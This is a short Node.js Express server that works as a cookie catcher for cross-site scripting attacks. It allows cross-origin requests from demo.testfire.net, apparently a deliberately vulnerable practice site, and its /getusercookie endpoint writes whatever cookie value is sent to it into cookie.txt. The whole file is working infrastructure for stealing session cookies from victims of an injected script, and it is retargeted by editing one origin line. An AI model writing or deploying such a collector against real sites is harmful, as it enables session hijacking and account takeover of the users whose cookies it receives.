const express = require("express");
const bodyParser = require("body-parser");
const router = express.Router();
const app = express();
var cors = require("cors");

var corsOptions = {
  origin: "https://demo.testfire.net",
  optionsSuccessStatus: 200,
};

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const fs = require("fs");
const port = 3000;

router.get("/getusercookie", cors(corsOptions), (req, res) => {
  var cookie = req.query.cookie;
  console.log(req.body);
  fs.writeFile("./cookie.txt", cookie, function (err) {
    if (err) {
      return console.log(err);
    }
    console.log(cookie);
    res.send();
  });
});

app.use("/", router);
app.listen(port, () => console.log(`listening on port ${port}`));
